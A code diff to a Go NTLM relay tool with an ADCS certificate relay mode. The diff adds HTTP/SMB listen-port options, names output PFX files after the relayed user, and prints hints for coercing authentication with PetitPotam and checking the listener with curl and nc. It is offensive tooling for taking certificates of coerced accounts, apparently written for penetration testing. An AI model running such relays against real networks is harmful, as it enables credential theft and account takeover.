@@ -79,6 +79,13 @@ func runRelay() {
 		"Certificate template name for ADCS relay (e.g., User, Machine).",
 	)
 
+	cli.Flag(
+		&cfg.ListenPorts,
+		"p", "ports",
+		cfg.ListenPorts,
+		"Ports to listen on: 80 (HTTP), 445 (SMB), or both (default: both).",
+	)
+
 	// Parse flags
 	cli.Parse()
 
@@ -116,23 +123,29 @@ func runRelay() {
 		logger.Warning("Not running as root - may fail to bind to port 445")
 	}
 
-	// Set default output path if not specified
-	if cfg.OutputPath == "" {
-		cfg.OutputPath = "certificate.pfx"
-	}
+	// Note: OutputPath defaults to "" to allow handlers to generate username-based filenames
+	// Handlers will use <username>.pfx if OutputPath is empty
 
 	logger.Info(fmt.Sprintf("Relay Mode: %s", cfg.RelayMode))
 	logger.Info(fmt.Sprintf("Target: %s", cfg.TargetURL))
 	if cfg.RelayMode == "adcs" {
 		logger.Info(fmt.Sprintf("Certificate Template: %s", cfg.TemplateName))
+		if cfg.OutputPath != "" {
+			logger.Info(fmt.Sprintf("Output PFX: %s", cfg.OutputPath))
+		} else {
+			logger.Info("Output PFX: <username>.pfx (auto-generated)")
+		}
 	} else {
 		logger.Info(fmt.Sprintf("Target User: %s", cfg.TargetUser))
+		if cfg.OutputPath != "" {
+			logger.Info(fmt.Sprintf("Output PFX: %s", cfg.OutputPath))
+		}
 	}
-	logger.Info(fmt.Sprintf("Output PFX: %s", cfg.OutputPath))
 
 	// Create relay config
 	relayConfig := &relay.Config{
 		ListenAddr:   cfg.ListenAddr,
+		ListenPorts:  cfg.ListenPorts,
 		TargetURL:    cfg.TargetURL,
 		TargetUser:   cfg.TargetUser,
 		OutputPath:   cfg.OutputPath,
@@ -166,6 +179,18 @@ func runRelay() {
 
 	logger.Info("Waiting for incoming connection to relay...")
 	logger.Info("Press Ctrl+C to stop")
+	logger.Info("")
+	logger.Info("To test with PetitPotam:")
+	logger.Info(fmt.Sprintf("  python3 PetitPotam.py %s <target-ip>", cfg.ListenAddr))
+	logger.Info("")
+	logger.Info("To test connectivity:")
+	if cfg.ListenPorts == "80" || cfg.ListenPorts == "both" {
+		logger.Info(fmt.Sprintf("  curl http://%s/test", cfg.ListenAddr))
+	}
+	if cfg.ListenPorts == "445" || cfg.ListenPorts == "both" {
+		logger.Info(fmt.Sprintf("  nc -zv %s 445", cfg.ListenAddr))
+	}
+	logger.Info("")
 
 	// Wait for context cancellation
 	<-ctx.Done()
